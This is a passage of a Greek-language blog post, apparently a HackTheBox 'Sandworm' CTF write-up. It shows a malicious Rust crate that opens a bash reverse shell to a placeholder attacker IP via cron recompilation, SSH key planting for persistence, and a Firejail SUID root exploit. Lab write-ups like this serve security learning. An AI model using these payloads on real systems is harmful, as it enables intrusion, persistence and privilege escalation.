+      <span class="term-label">εντοπισμός του εγγράψιμου crate</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~/opt/tipnet/target/debug</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">cat tipnet.d</span>
+<span class="po">/opt/crates/logger/src/lib.rs /opt/tipnet/src/main.rs</span>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-08-bb128da54a.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-08-bb128da54a.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="tipnet debug folder" width="602" height="521"></picture>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ls -l /opt/crates/logger/src/lib.rs</span>
+<span class="po">-rw-</span><span class="py">rw</span><span class="po">-r-- 1 atlas </span><span class="py">silentobserver</span><span class="po"> 732 May  4 17:12 lib.rs</span></div>
+  </div>
+
+  <p><strong>Ο silentobserver έχει δικαίωμα εγγραφής.</strong> Εισάγουμε ένα reverse shell μέσα στο <code>lib.rs</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">lib.rs — κακόβουλο payload Rust</span>
+    </div>
+    <div class="term-body"><span class="pco">// /opt/crates/logger/src/lib.rs</span>
+<span class="pb">use</span> std::process::Command;
+
+<span class="pb">pub fn</span> <span class="pg">log</span>(user: &amp;str, query: &amp;str, justification: &amp;str) {
+    <span class="pb">let</span> output = Command::new(<span class="py">"bash"</span>)
+        .arg(<span class="py">"-c"</span>)
+        .arg(<span class="py">"bash -i &gt;&amp; /dev/tcp/&lt;YOUR_IP&gt;/4444 0&gt;&amp;1"</span>)
+        .output()
+        .expect(<span class="py">"failed to execute process"</span>);
+}</div>
+  </div>
+
+  <p>Περιμένουμε το cron job να ξαναμεταγλωττίσει το tipnet. Το shell γυρνάει πίσω:</p>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-09-f6d9ca8852.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-09-f6d9ca8852.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Second atlas reverse shell via tipnet" width="826" height="357"></picture>
+<p>Φυτεύουμε ένα κλειδί SSH για persistence:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">atlas — persistence με SSH</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">echo "&lt;YOUR_PUBLIC_KEY&gt;" >> ~/.ssh/authorized_keys</span>
+
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">ssh -i id_rsa atlas@ssa.htb</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$</span></div>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-10-d0a84d3827.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-10-d0a84d3827.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Stable SSH session as atlas" width="817" height="221"></picture>
+  </div>
+
+  <!-- ══ ROOT ══ -->
+  <h2>Privilege Escalation — Root μέσω Firejail</h2>
+
+  <h3>Ανακάλυψη</h3>
+  <p>Τρέχοντας το <code>linpeas.sh</code>, εντοπίζουμε ένα μη τυπικό SUID binary:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">linpeas — SUID</span>
+    </div>
+    <div class="term-body"><span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">./linpeas.sh | grep -i firejail</span>
+<span class="pr">-rwsr-x--- 1 root jailer 1777952 Nov 29 2022 /usr/local/bin/firejail</span></div>
+  </div>
+
+  <p>Το <code>firejail</code> έχει το SUID bit ενεργοποιημένο και είναι εκμεταλλεύσιμο μέσω ενός γνωστού local privilege escalation. Μεταφέρουμε το exploit και το τρέχουμε — απαιτεί προσέγγιση με δύο terminal:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">firejail exploit — δύο terminal</span>
+    </div>
+    <div class="term-body"><span class="pco"># Terminal 1 — τρέχουμε το exploit</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">chmod +x exploit.py && python3 exploit.py</span>
+<span class="po">You can now run 'firejail --join=</span><span class="py">24654</span><span class="po">' in another terminal
+where 'su -' should grant you a root shell.</span>
+
+<span class="pco"># Terminal 2 — join στο session του firejail</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">firejail --join=24654</span>
+<span class="po">changing root to /proc/24654/root
+Child process initialized in 9.92 ms</span>
+<span class="pu">SP1R4</span><span class="ps">@</span><span class="ph">kali</span><span class="ps">)-[</span><span class="pp">~</span><span class="ps">]</span>
+<span class="pd">└$ </span><span class="pc">su -</span>
+<span class="pr">root@sandworm</span><span class="po">:~# </span><span class="pc">cat /root/root.txt</span>
+<span class="py">d5be56ad************************</span></div>
+  </div>
+
+  <picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-11-6a91a0f42f.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-11-6a91a0f42f.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="exploit.py output with session number" width="792" height="386"></picture>
+<picture data-img-optimized="1"><source srcset="assets/htb-sandworm/img-12-954b359437.webp" type="image/webp"><img loading="lazy" decoding="async" src="assets/htb-sandworm/img-12-954b359437.png" style="max-width:100%;height:auto;display:block;margin:1rem auto;border-radius:6px;border:1px solid var(--border);" alt="Root shell and root flag" width="860" height="431"></picture>
+<div class="alert alert-success">🚩 Root flag αποκτήθηκε. Το machine pwned.</div>
+
+  <!-- ══ SUMMARY ══ -->
+  <h2>Σύνοψη</h2>
+
+  <table class="st">
+    <tr><th>Στάδιο</th><th>Τεχνική</th><th>Εργαλείο</th></tr>
+    <tr><td>Foothold</td><td>SSTI μέσω πεδίου name του GPG (Jinja2)</td><td>gpg</td></tr>
+    <tr><td>Shell</td><td>Reverse shell κωδικοποιημένο σε base64</td><td>bash, nc</td></tr>
+    <tr><td>Πλευρική κίνηση</td><td>Hardcoded creds σε session HTTPie</td><td>ssh</td></tr>
+    <tr><td>Αναβάθμιση shell</td><td>Κακόβουλο Rust crate εισηγμένο μέσω cron</td><td>nano</td></tr>
+    <tr><td>Root</td><td>Firejail SUID local privilege escalation</td><td>python3</td></tr>
+  </table>
+
+  <!-- ══ COMMAND REF ══ -->
+  <h2>Βασικές εντολές</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">γρήγορη αναφορά</span>
+    </div>
+    <div class="term-body"><span class="pco"># Ροή εργασίας κλειδιού GPG</span>
+<span class="pc">gpg --gen-key</span>                               <span class="pco"># Real name: &lt;SSTI_PAYLOAD&gt;</span>
+<span class="pc">gpg --armor --export &lt;email&gt; > pub.asc</span>
+<span class="pc">gpg --clear-sign --output signed.asc msg.txt</span>
+<span class="pc">gpg --delete-secret-keys &lt;email&gt;</span>
+<span class="pc">gpg --delete-keys &lt;email&gt;</span>
+
+<span class="pco"># Firejail privesc</span>
+<span class="pc">python3 exploit.py</span>                          <span class="pco"># σημειώστε τον αριθμό session</span>
+<span class="pc">firejail --join=&lt;number&gt;</span>
+<span class="pc">su -</span></div>
+  </div>
+
+</div>
+
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Όλα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
